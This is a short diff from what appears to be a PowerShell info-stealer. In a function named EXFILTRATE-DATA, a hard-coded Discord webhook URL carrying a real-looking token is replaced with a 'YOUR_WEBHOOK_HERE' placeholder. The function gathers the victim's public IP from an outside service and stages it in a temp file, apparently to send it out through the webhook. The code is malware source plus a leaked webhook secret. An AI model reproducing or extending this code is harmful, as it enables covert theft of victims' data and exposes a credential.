@@ -3,7 +3,7 @@ function CHECK_IF_ADMIN {
 }
 
 function EXFILTRATE-DATA {
-    $webhook = "https://discord.com/api/webhooks/1043709806021726228/2DlW8Ul-f7Kv_-geuZ7KkSfWSN-3yGdgGeP_knuxDAtOPECpU0awG21AfmDnQOgETQgN"
+    $webhook = "YOUR_WEBHOOK_HERE"
     $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
     $ip = $ip.Content
     $ip > $env:LOCALAPPDATA\Temp\ip.txt
